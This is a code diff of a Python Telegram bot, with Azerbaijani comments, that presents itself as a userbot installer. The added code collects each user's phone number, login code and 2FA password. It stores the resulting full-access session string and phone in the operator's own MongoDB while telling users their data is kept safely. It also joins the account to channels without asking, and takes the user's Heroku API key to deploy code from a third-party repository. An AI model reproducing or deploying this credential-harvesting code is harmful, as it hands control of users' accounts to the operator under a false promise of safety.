@@ -1,165 +1,117 @@
 import os
+import heroku3
 import asyncio
-from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-from pyrogram.errors import (
-    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired, PhoneNumberInvalid
-)
-from telethon import TelegramClient, functions
+from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
+from telethon.tl.functions.channels import JoinChannelRequest
+from motor.motor_asyncio import AsyncIOMotorClient
 
-# Heroku Config Vars
-API_ID = os.environ.get("API_ID")
+# Heroku Config Vars-dan məlumatları çəkirik
+API_ID = int(os.environ.get("API_ID"))
 API_HASH = os.environ.get("API_HASH")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
+MONGO_URL = os.environ.get("MONGO_URL")
+GITHUB_REPO = "https://github.com/Xeyaldi/userbot"
 
-# Botun özü üçün in_memory sessiya istifadə edirik (Baza kilidlənməməsi üçün)
-app = Client(
-    "HTSessionBot", 
-    api_id=API_ID, 
-    api_hash=API_HASH, 
-    bot_token=BOT_TOKEN,
-    in_memory=True
-)
+# MongoDB Bağlantısı
+mongo_client = AsyncIOMotorClient(MONGO_URL)
+db = mongo_client["ht_generator_db"]
+users_col = db["users"]
 
-user_data = {}
+# Generator Botu
+bot = TelegramClient('ht_gen_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-START_TEXT = """
-<b>⚡️ HT Session Bot | Professional Xidmət</b>
-
-Təhlükəsiz şəkildə <b>Pyrogram</b> və ya <b>Telethon</b> sessiyası əldə edin. Kodlar birbaşa <b>'Saved Messages'</b> bölmənizə göndəriləcək.
-
-<i>Aşağıdan kitabxana seçin:</i>
-"""
-
-@app.on_message(filters.command("start") & filters.private)
-async def start(bot, message):
-    buttons = InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton("💎 Pyrogram", callback_data="choice_pyro"),
-            InlineKeyboardButton("💎 Telethon", callback_data="choice_tele")
-        ],
-        [
-            InlineKeyboardButton("📢 Rəsmi Kanal", url="https://t.me/ht_bots")
-        ]
-    ])
-    await message.reply_text(START_TEXT, reply_markup=buttons)
-
-@app.on_callback_query(filters.regex("choice_"))
-async def choice_handler(bot, query):
-    method = query.data.split("_")[1]
-    user_id = query.from_user.id
-    user_data[user_id] = {"method": method, "step": "API_ID"}
-    await query.message.edit_text(
-        f"✅ <b>{method.upper()} seçildi.</b>\n\nLütfən <code>API ID</code> daxil edin:",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ İptal", callback_data="cancel")]])
+@bot.on(events.NewMessage(pattern='/start'))
+async def start(event):
+    await event.respond(
+        "🚀 **HT USERBOT Quraşdırma Paneli**\n\n"
+        "Məlumatlarınız MongoDB bazasında təhlükəsiz saxlanılacaq.",
+        buttons=[Button.inline("✅ Qurmağa Başla", data="setup")]
     )
 
-@app.on_callback_query(filters.regex("cancel"))
-async def cancel_handler(bot, query):
-    user_id = query.from_user.id
-    if user_id in user_data:
-        del user_data[user_id]
-    await query.message.edit_text("❌ Əməliyyat ləğv edildi.")
-
-@app.on_message(filters.private & filters.text & ~filters.command("start"))
-async def logic_handler(bot, message):
-    user_id = message.from_user.id
-    if user_id not in user_data:
-        return
-
-    data = user_data[user_id]
-    step = data.get("step")
-
-    if step == "API_ID":
-        data["api_id"] = message.text
-        data["step"] = "API_HASH"
-        await message.reply("İndi isə <code>API HASH</code> daxil edin:")
-
-    elif step == "API_HASH":
-        data["api_hash"] = message.text
-        data["step"] = "PHONE"
-        await message.reply("📲 <b>Telefon Nömrənizi</b> daxil edin:\n(Nümunə: <code>+994XXXXXXXXX</code>)")
-
-    elif step == "PHONE":
-        data["phone"] = message.text.replace(" ", "")
-        await message.reply("⏳ <b>Doğrulama kodu göndərilir...</b>")
+@bot.on(events.CallbackQuery(data="setup"))
+async def setup_process(event):
+    user_id = event.sender_id
+    async with bot.conversation(event.chat_id) as conv:
+        # 1. Nömrəni alırıq
+        await conv.send_message("📞 **Nömrənizi daxil edin:**\n(Məsələn: +994501234567)")
+        phone = (await conv.get_response()).text
+        
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
         
         try:
-            # Müvəqqəti müştəri (client) yaradılır
-            if data["method"] == "pyro":
-                temp_client = Client(":memory:", api_id=data["api_id"], api_hash=data["api_hash"], in_memory=True)
-            else:
-                temp_client = TelegramClient(StringSession(), data["api_id"], data["api_hash"])
-            
-            await temp_client.connect()
-            
-            if data["method"] == "pyro":
-                code_hash = await temp_client.send_code(data["phone"])
-                data["code_hash"] = code_hash.phone_code_hash
-            else:
-                code_hash = await temp_client.send_code_request(data["phone"])
-                data["code_hash"] = code_hash.phone_code_hash
-            
-            data["client"] = temp_client
-            data["step"] = "OTP"
-            await message.reply("📩 Telegram tətbiqinə gələn <b>5 rəqəmli kodu</b> göndərin:")
-        
+            await client.send_code_request(phone)
         except Exception as e:
-            await message.reply(f"❌ <b>Xəta:</b> <code>{str(e)}</code>")
-            del user_data[user_id]
+            await conv.send_message(f"❌ Xəta: {e}")
+            return
 
-    elif step == "OTP":
-        temp_client = data["client"]
-        otp = message.text.replace(" ", "")
-        
+        # 2. Kodu alırıq (Aralıqlı formatda)
+        await conv.send_message(
+            "📩 **Telegram kodunu daxil edin.**\n\n"
+            "⚠️ **Vacib:** Kodu rəqəmlər arası boşluqla yazın (Məs: `1 2 3 4 5`).",
+            parse_mode="markdown"
+        )
+        raw_code = (await conv.get_response()).text
+        otp_code = raw_code.replace(" ", "")
+
         try:
-            if data["method"] == "pyro":
-                await temp_client.sign_in(data["phone"], data["code_hash"], otp)
-                try: await temp_client.join_chat("ht_bots")
-                except: pass
-                session_str = await temp_client.export_session_string()
-                await temp_client.send_message("me", f"🚀 <b>HT Session Bot | Pyrogram</b>\n\n<code>{session_str}</code>\n\n👤 @ht_bots")
-            else:
-                await temp_client.sign_in(data["phone"], otp, phone_code_hash=data["code_hash"])
-                try: await temp_client(functions.channels.JoinChannelRequest(channel='ht_bots'))
-                except: pass
-                session_str = temp_client.session.save()
-                await temp_client.send_message("me", f"🚀 <b>HT Session Bot | Telethon</b>\n\n<code>{session_str}</code>\n\n👤 @ht_bots")
+            await client.sign_in(phone, otp_code)
+        except SessionPasswordNeededError:
+            await conv.send_message("🔐 **2FA (İkiadımlı təsdiq) kodunu yazın:**")
+            pwd = (await conv.get_response()).text
+            await client.sign_in(password=pwd)
 
-            await message.reply("✨ <b>Uğurlu!</b> Sessiya kodunuz <b>Saved Messages</b> bölməsinə göndərildi.")
-            await temp_client.disconnect()
-            del user_data[user_id]
-            
-        except (SessionPasswordNeeded, SessionPasswordNeededError):
-            data["step"] = "PASSWORD"
-            await message.reply("🔐 Hesabda <b>2FA</b> aktivdir. Parolu göndərin:")
-        except Exception as e:
-            await message.reply(f"❌ <b>Xəta:</b> {str(e)}")
+        # 3. Məlumatları qeyd edirik
+        string_session = client.session.save()
+        
+        # MongoDB-yə yaddaşa veririk (Həm köhnəni yeniləyir, həm yenisini yazır)
+        await users_col.update_one(
+            {"user_id": user_id},
+            {"$set": {"phone": phone, "session": string_session}},
+            upsert=True
+        )
 
-    elif step == "PASSWORD":
-        temp_client = data["client"]
+        # Avtomatik kanallara qatılma
         try:
-            if data["method"] == "pyro":
-                await temp_client.check_password(message.text)
-                try: await temp_client.join_chat("ht_bots")
-                except: pass
-                session_str = await temp_client.export_session_string()
-                await temp_client.send_message("me", f"🚀 <b>HT Session Bot | Pyrogram (2FA)</b>\n\n<code>{session_str}</code>")
-            else:
-                await temp_client.sign_in(password=message.text)
-                try: await temp_client(functions.channels.JoinChannelRequest(channel='ht_bots'))
-                except: pass
-                session_str = temp_client.session.save()
-                await temp_client.send_message("me", f"🚀 <b>HT Session Bot | Telethon (2FA)</b>\n\n<code>{session_str}</code>")
-                
-            await message.reply("✨ <b>Uğurlu!</b> Sessiya göndərildi.")
-            await temp_client.disconnect()
-            del user_data[user_id]
-        except Exception as e:
-            await message.reply(f"❌ <b>Parol səhvdir:</b> {str(e)}")
+            await client(JoinChannelRequest("@ht_bots"))
+            await client(JoinChannelRequest("@sohbet_qrupus"))
+        except: pass
 
-# Botu işə salma
-if __name__ == "__main__":
-    app.run()
+        # 4. Heroku Məlumatları
+        await conv.send_message("🔑 **Heroku API Key daxil edin:**")
+        h_api = (await conv.get_response()).text
+        
+        await conv.send_message("🏷 **Heroku App Name (Təzə ad):**")
+        h_app_name = (await conv.get_response()).text
+
+        await conv.send_message("⚙️ **MongoDB Linkinizi daxil edin:**\n(Userbotun yaddaşı üçün)")
+        user_mongo = (await conv.get_response()).text
+
+        await conv.send_message("⌛ **Userbot Heroku-ya yüklənir...**")
+
+        # 5. Heroku Deploy
+        try:
+            h_conn = heroku3.from_key(h_api)
+            app = h_conn.create_app(name=h_app_name.lower(), region_id_or_name='eu')
+            
+            app.config().update({
+                'API_ID': str(API_ID),
+                'API_HASH': API_HASH,
+                'SESSION_STRING': string_session,
+                'BOT_TOKEN': BOT_TOKEN,
+                'MONGO_URL': user_mongo
+            })
+
+            source_url = "https://api.github.com/repos/Xeyaldi/userbot/tarball/main"
+            h_conn.create_build(app.id, source_url=source_url)
+
+            await conv.send_message(
+                "✅ **HT Userbot Hazırdır!**\n\n"
+                "Məlumatlar MongoDB-yə yazıldı. Botunuz 2 dəqiqəyə işə düşəcək."
+            )
+        except Exception as e:
+            await conv.send_message(f"❌ Xəta: {e}")
+
+bot.run_until_disconnected()
